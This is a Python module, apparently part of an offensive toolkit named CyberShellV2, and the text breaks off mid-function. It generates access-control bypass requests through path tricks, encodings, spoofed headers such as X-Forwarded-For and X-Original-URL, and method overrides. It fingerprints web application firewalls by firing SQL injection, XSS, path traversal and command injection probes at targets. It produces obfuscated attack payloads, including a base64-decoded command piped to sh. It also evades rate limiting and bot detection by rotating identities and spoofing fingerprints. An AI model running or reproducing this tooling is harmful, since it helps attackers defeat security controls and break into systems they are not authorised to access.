"""
Unified Bypass and Anti-Automation System for CyberShellV2
Combines bypass techniques with anti-automation evasion
"""

import urllib.parse
import base64
import json
import time
import random
import hashlib
import string
import re
import itertools
import requests
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum
from dataclasses import dataclass, field
from urllib.parse import quote, unquote, urlparse, parse_qs
from collections import defaultdict


# ============================================================================
# COMMON DATA STRUCTURES
# ============================================================================

class BypassCategory(Enum):
    """Categories of bypass techniques"""
    PATH_MANIPULATION = "Path Manipulation"
    ENCODING = "Encoding Techniques"
    HEADER_INJECTION = "Header Injection"
    METHOD_OVERRIDE = "HTTP Method Override"
    PROTOCOL_ABUSE = "Protocol Abuse"
    PARSER_DIFFERENTIAL = "Parser Differential"
    UNICODE = "Unicode Bypass"
    CASE_VARIATION = "Case Variation"
    WAF_EVASION = "WAF Evasion"
    RATE_LIMIT = "Rate Limit Bypass"
    BOT_DETECTION = "Bot Detection Bypass"


@dataclass
class BypassPayload:
    """Structure for bypass payloads"""
    category: BypassCategory
    name: str
    technique: str
    description: str
    example: str
    success_rate: float = 0.5
    applicable_to: List[str] = field(default_factory=list)


@dataclass
class ProtectionDetection:
    """Detection result for protection mechanisms"""
    protection_type: str
    detected: bool
    details: Dict[str, Any]
    confidence: float
    bypass_recommendations: List[str]


# ============================================================================
# BYPASS TECHNIQUES (from bypass_techniques.py)
# ============================================================================

class AdvancedBypassGenerator:
    """Advanced bypass payload generator"""
    
    def __init__(self):
        self.bypass_techniques = self._initialize_techniques()
        self.encoding_functions = {
            'url': self.url_encode,
            'url_double': self.double_url_encode,
            'unicode': self.unicode_encode,
            'base64': self.base64_encode,
            'html': self.html_entity_encode,
            'hex': self.hex_encode,
            'mixed_case': self.mixed_case,
            'comment': self.comment_injection
        }
    
    def _initialize_techniques(self) -> Dict[BypassCategory, List[BypassPayload]]:
        """Initialize comprehensive bypass techniques"""
        
        techniques = {
            BypassCategory.PATH_MANIPULATION: [
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Double Slash",
                    technique="//",
                    description="Double slash before path",
                    example="/admin -> //admin",
                    success_rate=0.6,
                    applicable_to=["nginx", "apache"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Path Traversal",
                    technique="..//",
                    description="Path traversal with double slash",
                    example="/admin -> /..//admin",
                    success_rate=0.5,
                    applicable_to=["nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Trailing Slash",
                    technique="/",
                    description="Add trailing slash",
                    example="/admin -> /admin/",
                    success_rate=0.4,
                    applicable_to=["apache", "nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Dot Segment",
                    technique="/./",
                    description="Insert dot segments",
                    example="/admin -> /./admin",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Multiple Slashes",
                    technique="///",
                    description="Multiple slashes",
                    example="/admin -> ///admin",
                    success_rate=0.4,
                    applicable_to=["nginx"]
                ),
            ],
            
            BypassCategory.ENCODING: [
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="URL Encoding",
                    technique="%2F",
                    description="URL encode slashes",
                    example="/admin -> %2Fadmin",
                    success_rate=0.7,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="Double URL Encoding",
                    technique="%252F",
                    description="Double URL encode",
                    example="/admin -> %252Fadmin",
                    success_rate=0.6,
                    applicable_to=["apache", "iis"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="Unicode Encoding",
                    technique="%C0%AF",
                    description="Unicode encoded slash",
                    example="/admin -> %C0%AFadmin",
                    success_rate=0.5,
                    applicable_to=["iis"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="UTF-8 Encoding",
                    technique="%EF%BC%8F",
                    description="UTF-8 fullwidth slash",
                    example="/admin -> %EF%BC%8Fadmin",
                    success_rate=0.5,
                    applicable_to=["nginx", "apache"]
                ),
            ],
            
            BypassCategory.HEADER_INJECTION: [
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Original-URL",
                    technique="X-Original-URL",
                    description="Override URL via header",
                    example="X-Original-URL: /admin",
                    success_rate=0.7,
                    applicable_to=["nginx", "cloudflare"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Rewrite-URL",
                    technique="X-Rewrite-URL",
                    description="Rewrite URL via header",
                    example="X-Rewrite-URL: /admin",
                    success_rate=0.6,
                    applicable_to=["nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Forwarded-For",
                    technique="X-Forwarded-For",
                    description="Spoof source IP",
                    example="X-Forwarded-For: 127.0.0.1",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Custom-IP-Authorization",
                    technique="X-Custom-IP-Authorization",
                    description="Custom IP auth header",
                    example="X-Custom-IP-Authorization: 127.0.0.1",
                    success_rate=0.4,
                    applicable_to=["custom"]
                ),
            ],
            
            BypassCategory.METHOD_OVERRIDE: [
                BypassPayload(
                    category=BypassCategory.METHOD_OVERRIDE,
                    name="Method Override Header",
                    technique="X-HTTP-Method-Override",
                    description="Override HTTP method",
                    example="X-HTTP-Method-Override: GET",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.METHOD_OVERRIDE,
                    name="Alternative Methods",
                    technique="TRACE",
                    description="Use TRACE method",
                    example="TRACE /admin HTTP/1.1",
                    success_rate=0.4,
                    applicable_to=["apache"]
                ),
            ],
            
            BypassCategory.UNICODE: [
                BypassPayload(
                    category=BypassCategory.UNICODE,
                    name="Unicode Normalization",
                    technique="\uFF0F",
                    description="Unicode fullwidth slash",
                    example="/admin -> \uFF0Fadmin",
                    success_rate=0.5,
                    applicable_to=["nginx", "apache"]
                ),
            ],
        }
        
        return techniques
    
    def generate_bypass_payloads(self, original_path: str,
                                category: Optional[BypassCategory] = None) -> List[Dict[str, Any]]:
        """Generate bypass payloads for a given path"""
        payloads = []
        
        if category:
            techniques_to_apply = self.bypass_techniques.get(category, [])
        else:
            techniques_to_apply = []
            for tech_list in self.bypass_techniques.values():
                techniques_to_apply.extend(tech_list)
        
        for technique in techniques_to_apply:
            payload = self._apply_technique(original_path, technique)
            payloads.append({
                "original": original_path,
                "modified": payload,
                "technique": technique.name,
                "category": technique.category.value,
                "description": technique.description,
                "success_rate": technique.success_rate
            })
        
        return payloads
    
    def _apply_technique(self, path: str, technique: BypassPayload) -> str:
        """Apply a specific bypass technique to a path"""
        
        if technique.category == BypassCategory.PATH_MANIPULATION:
            if technique.technique == "//":
                return "/" + path
            elif technique.technique == "..//":
                return "/../" + path
            elif technique.technique == "/":
                return path if path.endswith("/") else path + "/"
            elif technique.technique == "/./":
                return "/./" + path.lstrip("/")
            elif technique.technique == "///":
                return "//" + path
        
        elif technique.category == BypassCategory.ENCODING:
            if technique.technique == "%2F":
                return path.replace("/", "%2F")
            elif technique.technique == "%252F":
                return path.replace("/", "%252F")
            elif technique.technique == "%C0%AF":
                return path.replace("/", "%C0%AF")
            elif technique.technique == "%EF%BC%8F":
                return path.replace("/", "%EF%BC%8F")
        
        elif technique.category == BypassCategory.UNICODE:
            if technique.technique == "\uFF0F":
                return path.replace("/", "\uFF0F")
        
        return path
    
    def generate_combinatorial_bypasses(self, path: str, max_combinations: int = 3) -> List[str]:
        """Generate combinations of bypass techniques"""
        results = []
        all_techniques = []
        
        for tech_list in self.bypass_techniques.values():
            all_techniques.extend(tech_list)
        
        for r in range(1, min(max_combinations + 1, len(all_techniques) + 1)):
            for combo in itertools.combinations(all_techniques, r):
                modified_path = path
                for technique in combo:
                    modified_path = self._apply_technique(modified_path, technique)
                
                if modified_path != path:
                    results.append(modified_path)
        
        return list(set(results))
    
    # Encoding methods
    def url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return quote(payload)
    
    def double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return quote(quote(payload))
    
    def unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def base64_encode(self, payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def html_entity_encode(self, payload: str) -> str:
        """HTML entity encode payload"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def mixed_case(self, payload: str) -> str:
        """Random case variation"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def comment_injection(self, payload: str) -> str:
        """Insert comments in payload"""
        if "SELECT" in payload.upper() or "UNION" in payload.upper():
            return payload.replace(" ", "/**/")
        return payload


# ============================================================================
# WAF BYPASS ENGINE (Enhanced from both files)
# ============================================================================

class WAFBypassEngine:
    """Enhanced WAF bypass engine with detection and evasion"""
    
    def __init__(self):
        self.generator = AdvancedBypassGenerator()
        self.encoding_chains = self._initialize_encoding_chains()
        self.waf_signatures = self._initialize_waf_signatures()
        self.evasion_history = defaultdict(list)
    
    def _initialize_encoding_chains(self) -> List[List[str]]:
        """Initialize encoding chains for multi-layer encoding"""
        return [
            ["url", "url"],
            ["url", "unicode"],
            ["unicode", "url"],
            ["base64", "url"],
            ["html", "url"],
            ["hex", "url"],
            ["url", "base64", "url"]
        ]
    
    def _initialize_waf_signatures(self) -> Dict[str, Dict[str, Any]]:
        """Initialize WAF detection signatures"""
        return {
            'Cloudflare': {
                'headers': ['cf-ray', 'cloudflare', '__cfduid', 'cf-cache-status'],
                'errors': ['cloudflare', '1020', 'ray id'],
                'evasion_priority': ['encoding', 'header_manipulation', 'fragmentation']
            },
            'AWS WAF': {
                'headers': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-cf-id'],
                'errors': ['403 forbidden', 'aws waf'],
                'evasion_priority': ['unicode', 'double_encoding', 'case_variation']
            },
            'Akamai': {
                'headers': ['akamai', 'akamai-cache-status', 'akamai-request-id'],
                'errors': ['access denied', 'akamai'],
                'evasion_priority': ['path_manipulation', 'method_override']
            },
            'ModSecurity': {
                'headers': ['mod_security', 'modsecurity'],
                'errors': ['mod_security', '406 not acceptable'],
                'evasion_priority': ['comment_injection', 'encoding', 'chunking']
            },
            'Imperva': {
                'headers': ['x-iinfo', 'imperva'],
                'errors': ['access denied', 'imperva'],
                'evasion_priority': ['header_injection', 'encoding_chains']
            }
        }
    
    def detect_waf(self, target: str) -> ProtectionDetection:
        """Detect WAF presence and type"""
        
        test_payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "; ls -la"
        ]
        
        for payload in test_payloads:
            try:
                response = requests.get(
                    f"{target}?test={payload}",
                    headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=5,
                    allow_redirects=False
                )
                
                headers_text = str(response.headers).lower()
                body_text = response.text.lower() if response.text else ""
                
                for waf_name, signatures in self.waf_signatures.items():
                    detected = False
                    
                    # Check headers
                    for header in signatures['headers']:
                        if header.lower() in headers_text:
                            detected = True
                            break
                    
                    # Check error messages
                    for error in signatures['errors']:
                        if error.lower() in body_text:
                            detected = True
                            break
                    
                    if detected:
                        return ProtectionDetection(
                            protection_type='WAF',
                            detected=True,
                            details={'waf_type': waf_name},
                            confidence=0.9,
                            bypass_recommendations=signatures['evasion_priority']
                        )
                
                # Generic WAF detection
                if response.status_code in [403, 406, 419, 429, 503]:
                    if any(word in body_text for word in ['blocked', 'denied', 'detected', 'forbidden']):
                        return ProtectionDetection(
                            protection_type='WAF',
                            detected=True,
                            details={'waf_type': 'Generic'},
                            confidence=0.7,
                            bypass_recommendations=['encoding', 'header_manipulation']
                        )
                        
            except Exception as e:
                continue
        
        return ProtectionDetection(
            protection_type='WAF',
            detected=False,
            details={},
            confidence=0.0,
            bypass_recommendations=[]
        )
    
    def generate_waf_evasion_payloads(self, payload: str,
                                     waf_type: Optional[str] = None) -> List[Dict[str, str]]:
        """Generate WAF evasion variants of a payload"""
        evasions = []
        
        # Get WAF-specific evasion priorities
        if waf_type and waf_type in self.waf_signatures:
            priorities = self.waf_signatures[waf_type]['evasion_priority']
        else:
            priorities = ['encoding', 'comment_injection', 'case_variation']
        
        # Apply evasion techniques based on priorities
        for priority in priorities:
            if priority == 'encoding':
                evasions.extend(self._generate_encoding_evasions(payload))
            elif priority == 'comment_injection':
                evasions.append(self._generate_comment_evasion(payload))
            elif priority == 'case_variation':
                evasions.append(self._generate_case_evasion(payload))
            elif priority == 'chunking':
                evasions.append(self._generate_chunked_evasion(payload))
            elif priority == 'unicode':
                evasions.append(self._generate_unicode_evasion(payload))
            elif priority == 'double_encoding':
                evasions.append(self._generate_double_encoded_evasion(payload))
        
        # SQL-specific evasions
        if self._is_sql_payload(payload):
            evasions.extend(self._generate_sql_evasions(payload))
        
        # XSS-specific evasions
        if self._is_xss_payload(payload):
            evasions.extend(self._generate_xss_evasions(payload))
        
        # Command injection evasions
        if self._is_command_payload(payload):
            evasions.extend(self._generate_command_evasions(payload))
        
        return evasions
    
    def _is_sql_payload(self, payload: str) -> bool:
        """Check if payload is SQL injection"""
        sql_keywords = ['select', 'union', 'insert', 'update', 'delete', 'drop', 'from', 'where']
        payload_lower = payload.lower()
        return any(keyword in payload_lower for keyword in sql_keywords)
    
    def _is_xss_payload(self, payload: str) -> bool:
        """Check if payload is XSS"""
        xss_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(', 'prompt(']
        payload_lower = payload.lower()
        return any(indicator in payload_lower for indicator in xss_indicators)
    
    def _is_command_payload(self, payload: str) -> bool:
        """Check if payload is command injection"""
        cmd_indicators = ['|', ';', '&', '$', '`', '$(', '${']
        return any(indicator in payload for indicator in cmd_indicators)
    
    def _generate_encoding_evasions(self, payload: str) -> List[Dict[str, str]]:
        """Generate encoding-based evasions"""
        evasions = []
        
        for chain in self.encoding_chains:
            encoded = payload
            for encoding in chain:
                if encoding == 'url':
                    encoded = self.generator.url_encode(encoded)
                elif encoding == 'unicode':
                    encoded = self.generator.unicode_encode(encoded)
                elif encoding == 'base64':
                    encoded = self.generator.base64_encode(encoded)
                elif encoding == 'html':
                    encoded = self.generator.html_entity_encode(encoded)
                elif encoding == 'hex':
                    encoded = self.generator.hex_encode(encoded)
            
            evasions.append({
                "technique": f"encoding_chain_{'-'.join(chain)}",
                "payload": encoded,
                "description": f"Encoding chain: {' -> '.join(chain)}"
            })
        
        return evasions
    
    def _generate_comment_evasion(self, payload: str) -> Dict[str, str]:
        """Generate comment-based evasion"""
        return {
            "technique": "comment_injection",
            "payload": self.generator.comment_injection(payload),
            "description": "Comment injection"
        }
    
    def _generate_case_evasion(self, payload: str) -> Dict[str, str]:
        """Generate case variation evasion"""
        return {
            "technique": "case_variation",
            "payload": self.generator.mixed_case(payload),
            "description": "Random case variation"
        }
    
    def _generate_chunked_evasion(self, payload: str) -> Dict[str, str]:
        """Generate chunked payload evasion"""
        chunks = [payload[i:i+10] for i in range(0, len(payload), 10)]
        chunked = '+'.join([f"'{chunk}'" for chunk in chunks])
        
        return {
            "technique": "chunking",
            "payload": chunked,
            "description": "Payload chunking"
        }
    
    def _generate_unicode_evasion(self, payload: str) -> Dict[str, str]:
        """Generate unicode evasion"""
        return {
            "technique": "unicode",
            "payload": self.generator.unicode_encode(payload),
            "description": "Unicode encoding"
        }
    
    def _generate_double_encoded_evasion(self, payload: str) -> Dict[str, str]:
        """Generate double encoded evasion"""
        return {
            "technique": "double_encoding",
            "payload": self.generator.double_url_encode(payload),
            "description": "Double URL encoding"
        }
    
    def _generate_sql_evasions(self, payload: str) -> List[Dict[str, str]]:
        """Generate SQL-specific evasions"""
        evasions = []
        
        # Space replacement variations
        space_replacements = ['/**/','%20','+','%09','%0a','%0b','%0c','%0d','%a0']
        for replacement in space_replacements:
            evasions.append({
                "technique": f"sql_space_{replacement}",
                "payload": payload.replace(' ', replacement),
                "description": f"SQL space replacement with {replacement}"
            })
        
        # Case variations for keywords
        sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        modified = payload
        for keyword in sql_keywords:
            if keyword in modified.upper():
                mixed = ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(keyword))
                modified = re.sub(keyword, mixed, modified, flags=re.IGNORECASE)
        
        evasions.append({
            "technique": "sql_keyword_case",
            "payload": modified,
            "description": "SQL keyword case variation"
        })
        
        # MySQL-specific comments
        evasions.append({
            "technique": "sql_mysql_comment",
            "payload": f"/*!50000{payload}*/",
            "description": "MySQL version-specific comment"
        })
        
        return evasions
    
    def _generate_xss_evasions(self, payload: str) -> List[Dict[str, str]]:
        """Generate XSS-specific evasions"""
        evasions = []
        
        # Tag variations
        if '<script' in payload.lower():
            variations = [
                payload.replace('<script', '<ScRiPt'),
                payload.replace('<script', '<script/xss'),
                payload.replace('<script', '<script\x00'),
                payload.replace('</script>', '</script\x00>'),
            ]
            
            for i, variant in enumerate(variations):
                evasions.append({
                    "technique": f"xss_tag_variation_{i}",
                    "payload": variant,
                    "description": "XSS tag variation"
                })
        
        # Event handler obfuscation
        if 'onerror=' in payload.lower() or 'onload=' in payload.lower():
            evasions.append({
                "technique": "xss_event_obfuscation",
                "payload": payload.replace('=', '\x00='),
                "description": "XSS event handler obfuscation"
            })
        
        # Alternative XSS vectors
        if 'alert(' in payload:
            alternatives = [
                f"<svg onload={payload}>",
                f"<img src=x onerror={payload}>",
                f"<body onload={payload}>",
                f"<iframe src=javascript:{payload}>"
            ]
            
            for i, alt in enumerate(alternatives):
                evasions.append({
                    "technique": f"xss_alternative_{i}",
                    "payload": alt,
                    "description": "Alternative XSS vector"
                })
        
        return evasions
    
    def _generate_command_evasions(self, payload: str) -> List[Dict[str, str]]:
        """Generate command injection evasions"""
        evasions = []
        
        # Variable substitution
        evasions.append({
            "technique": "cmd_var_substitution",
            "payload": payload.replace(' ', '${IFS}'),
            "description": "Command variable substitution"
        })
        
        # Base64 encoding
        b64_cmd = base64.b64encode(payload.encode()).decode()
        evasions.append({
            "technique": "cmd_base64",
            "payload": f"echo {b64_cmd} | base64 -d | sh",
            "description": "Base64 encoded command"
        })
        
        # Hex encoding
        hex_cmd = ''.join(f'\\x{ord(c):02x}' for c in payload)
        evasions.append({
            "technique": "cmd_hex",
            "payload": f"echo -e '{hex_cmd}'",
            "description": "Hex encoded command"
        })
        
        return evasions


# ============================================================================
# ANTI-AUTOMATION ENGINE (from anti_automation_plugin.py)
# ============================================================================

class AntiAutomationEngine:
    """Engine for bypassing anti-automation mechanisms"""
    
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.rate_limit_delays = {}
        self.proxy_pool = []
        self.fingerprint_data = {}
        self.session_cache = {}
    
    def _load_user_agents(self) -> List[str]:
        """Load realistic user agent strings"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
    
    def detect_rate_limiting(self, target: str) -> ProtectionDetection:
        """Detect rate limiting protection"""
        try:
            # Send rapid requests
            for i in range(20):
                response = requests.get(target, timeout=2)
                if response.status_code == 429:
                    return ProtectionDetection(
                        protection_type='Rate Limiting',
                        detected=True,
                        details={'triggered_at_request': i+1},
                        confidence=1.0,
                        bypass_recommendations=['Add delays', 'Use proxy rotation', 'Implement session persistence']
                    )
                time.sleep(0.1)
        except:
            pass
        
        return ProtectionDetection(
            protection_type='Rate Limiting',
            detected=False,
            details={},
            confidence=0.0,
            bypass_recommendations=[]
        )
    
    def detect_bot_protection(self, target: str) -> ProtectionDetection:
        """Detect bot protection mechanisms"""
        detections = []
        confidence = 0.0
        
        try:
            # Test without user agent
            response = requests.get(target, headers={}, timeout=5)
            if response.status_code == 403:
                detections.append('User-Agent Required')
                confidence += 0.3
            
            # Test with bot user agent
            bot_ua = 'Bot/1.0'
            response = requests.get(target, headers={'User-Agent': bot_ua}, timeout=5)
            if response.status_code == 403:
                detections.append('Bot User-Agent Blocked')
                confidence += 0.3
            
            # Check for JavaScript challenges
            if 'challenge-platform' in response.text or 'jschl' in response.text:
                detections.append('JavaScript Challenge')
                confidence += 0.4
            
            # Check for fingerprinting
            if 'fingerprint' in response.text or 'fp-' in response.text:
                detections.append('Browser Fingerprinting')
                confidence += 0.3
        except:
            pass
        
        return ProtectionDetection(
            protection_type='Bot Detection',
            detected=len(detections) > 0,
            details={'mechanisms': detections},
            confidence=min(confidence, 1.0),
            bypass_recommendations=['Use browser automation', 'Implement realistic behavior', 'Rotate fingerprints']
        )
    
    def detect_captcha(self, target: str) -> ProtectionDetection:
        """Detect CAPTCHA presence"""
        captcha_indicators = [
            'recaptcha', 'g-recaptcha', 'h-captcha', 'hcaptcha',
            'captcha', 'security-check', 'challenge-form'
        ]
        
        try:
            response = requests.get(target, timeout=5)
            content = response.text.lower()
            
            detected_captchas = []
            for indicator in captcha_indicators:
                if indicator in content:
                    detected_captchas.append(indicator)
            
            if detected_captchas:
                return ProtectionDetection(
                    protection_type='CAPTCHA',
                    detected=True,
                    details={'types': detected_captchas},
                    confidence=0.95,
                    bypass_recommendations=['Use CAPTCHA solving service', 'Maintain session cookies', 'Use trusted IPs']
                )
        except:
            pass
        
        return ProtectionDetection(
            protection_type='CAPTCHA',
            detected=False,
            details={},
            confidence=0.0,
            bypass_recommendations=[]
        )
    
    def rotate_identity(self) -> Dict[str, Any]:
        """Rotate identity to appear as different user"""
        new_identity = {
            'user_agent': random.choice(self.user_agents),
            'ip': self._get_new_proxy(),
            'session_id': self._generate_session_id(),
            'fingerprint': self._generate_fingerprint(),
            'cookies': self._generate_cookies()
        }
        
        return new_identity
    
    def _get_new_proxy(self) -> Optional[str]:
        """Get a new proxy from pool"""
        if self.proxy_pool:
            return random.choice(self.proxy_pool)
        return None
    
    def _generate_session_id(self) -> str:
        """Generate realistic session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def _generate_fingerprint(self) -> Dict[str, Any]:
        """Generate browser fingerprint"""
        return {
            'screen': random.choice(['1920x1080', '1366x768', '1440x900', '2560x1440']),
            'timezone': random.choice(['UTC-5', 'UTC-8', 'UTC+0', 'UTC+1']),
            'language': random.choice(['en-US', 'en-GB', 'en-CA']),
            'platform': random.choice(['Win32', 'MacIntel', 'Linux x86_64']),
            'plugins': random.choice([
                ['Chrome PDF Plugin', 'Native Client'],
                ['Shockwave Flash', 'Chrome PDF Plugin'],
                []
            ]),
            'canvas': hashlib.md5(str(random.random()).encode()).hexdigest(),
            'webgl': hashlib.md5(str(random.random()).encode()).hexdigest()
        }
    
    def _generate_cookies(self) -> Dict[str, str]:
        """Generate realistic cookies"""
        return {
            'session': self._generate_session_id(),
            'visitor': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            'consent': 'accepted',
            'lang': random.choice(['en', 'es', 'fr'])
        }
    
    def apply_rate_limit_delay(self, target: str, adaptive: bool = True):
        """Apply appropriate delay to avoid rate limiting"""
        domain = urlparse(target).netloc
        
        if adaptive and domain in self.rate_limit_delays:
            delay = self.rate_limit_delays[domain]
        else:
            # Random delay with jitter
            delay = random.uniform(0.5, 2.0) + random.gauss(0, 0.2)
            delay = max(0.1, delay)  # Minimum delay
            
            if adaptive:
                self.rate_limit_delays[domain] = delay
        
        time.sleep(delay)
    
    def get_evasion_headers(self, identity: Optional[Dict] = None) -> Dict[str, str]:
        """Get headers for evasion"""
        if not identity:
            identity = self.rotate_identity()
        
        headers = {
            'User-Agent': identity['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        # Add fingerprint headers
        if 'fingerprint' in identity:
            fp = identity['fingerprint']
            headers['Sec-CH-UA-Platform'] = f'"{fp.get("platform", "Windows")}"'
        
        return headers


# ============================================================================
# REQUEST MANIPULATOR (Enhanced from both files)
# ============================================================================

class RequestManipulator:
    """Enhanced request manipulation for bypass attempts"""
    
    def __init__(self):
        self.bypass_generator = AdvancedBypassGenerator()
        self.waf_engine = WAFBypassEngine()
        self.anti_automation = AntiAutomationEngine()
    
    def generate_bypass_requests(self, base_request: Dict[str, Any],
                                protection_detected: Optional[List[ProtectionDetection]] = None) -> List[Dict[str, Any]]:
        """Generate multiple bypass variations of a request"""
        bypass_requests = []
        
        # Extract base components
        method = base_request.get("method", "GET")
        path = base_request.get("path", "/")
        headers = base_request.get("headers", {}).copy()
        params = base_request.get("params", {})
        body = base_request.get("body", "")
        
        # Path-based bypasses
        path_bypasses = self.bypass_generator.generate_bypass_payloads(path)
        for bypass in path_bypasses:
            request = {
                "method": method,
                "path": bypass["modified"],
                "headers": headers.copy(),
                "params": params.copy(),
                "body": body,
                "bypass_technique": bypass["technique"],
                "success_rate": bypass["success_rate"]
            }
            bypass_requests.append(request)
        
        # Header-based bypasses
        header_bypasses = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "multipart/form-data"},
            {"Content-Type": "application/json"}
        ]
        
        for header_bypass in header_bypasses:
            bypass_headers = headers.copy()
            bypass_headers.update(header_bypass)
            request = {
                "method": method,
                "path": path,
                "headers": bypass_headers,
                "params": params.copy(),
                "body": body,
                "bypass_technique": f"header_{list(header_bypass.keys())[0]}",
                "success_rate": 0.5
            }
            bypass_requests.append(request)
        
        # Method-based bypasses
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
        for bypass_method in methods:
            if bypass_method != method:
                request = {
                    "method": bypass_method,
                    "path": path,
                    "headers": headers.copy(),
                    "params": params.copy(),
                    "body": body,
                    "bypass_technique": f"method_{bypass_method}",
                    "success_rate": 0.3
                }
                bypass_requests.append(request)
        
        # Parameter pollution
        if params:
            polluted_params = params.copy()
            for key in params.keys():
                polluted_params[key] = [params[key], params[key]]
            
            request = {
                "method": method,
                "path": path,
                "headers": headers.copy(),
                "params": polluted_params,
                "body": body,
                "bypass_technique": "parameter_pollution",
                "success_rate": 0.4
            }
            bypass_requests.append(request)
        
        # Protocol-based bypasses
        protocol_bypasses = [
            {"protocol": "HTTP/1.0"},
            {"protocol": "HTTP/2"},
            {"protocol": "HTTP/3"}
        ]
        
        for protocol in protocol_bypasses:
            request = {
                "method": method,
                "path": path,
                "headers": headers.copy(),
                "params": params.copy(),
                "body": body,
                "protocol": protocol["protocol"],
                "bypass_technique": f"protocol_{protocol['protocol']}",
                "success_rate": 0.3
            }
            bypass_requests.append(request)
        
        # Apply protection-specific bypasses
        if protection_detected:
            for protection in protection_detected:
                if protection.detected:
                    specific_bypasses = self._generate_protection_specific_bypasses(
                        base_request, protection
                    )
                    bypass_requests.extend(specific_bypasses)
        
        return bypass_requests
    
    def _generate_protection_specific_bypasses(self, base_request: Dict[str, Any],
                                              protection: ProtectionDetection) -> List[Dict[str, Any]]:
        """Generate bypasses specific to detected protection"""
        bypasses = []
        
        if protection.protection_type == 'WAF':
            # Apply WAF-specific evasions
            waf_type = protection.details.get('waf_type')
            if base_request.get('params'):
                for param_key, param_value in base_request['params'].items():
                    if isinstance(param_value, str):
                        evasions = self.waf_engine.generate_waf_evasion_payloads(
                            param_value, waf_type
                        )
                        
                        for evasion in evasions:
                            params_copy = base_request['params'].copy()
                            params_copy[param_key] = evasion['payload']
                            
                            bypasses.append({
                                "method": base_request.get("method", "GET"),
                                "path": base_request.get("path", "/"),
                                "headers": base_request.get("headers", {}).copy(),
                                "params": params_copy,
                                "body": base_request.get("body", ""),
                                "bypass_technique": f"waf_evasion_{evasion['technique']}",
                                "success_rate": 0.6
                            })
        
        elif protection.protection_type == 'Rate Limiting':
            # Add delay-based bypass
            bypasses.append({
                "method": base_request.get("method", "GET"),
                "path": base_request.get("path", "/"),
                "headers": self.anti_automation.get_evasion_headers(),
                "params": base_request.get("params", {}),
                "body": base_request.get("body", ""),
                "delay": random.uniform(1, 3),
                "bypass_technique": "rate_limit_delay",
                "success_rate": 0.7
            })
        
        elif protection.protection_type == 'Bot Detection':
            # Use realistic identity
            identity = self.anti_automation.rotate_identity()
            bypasses.append({
                "method": base_request.get("method", "GET"),
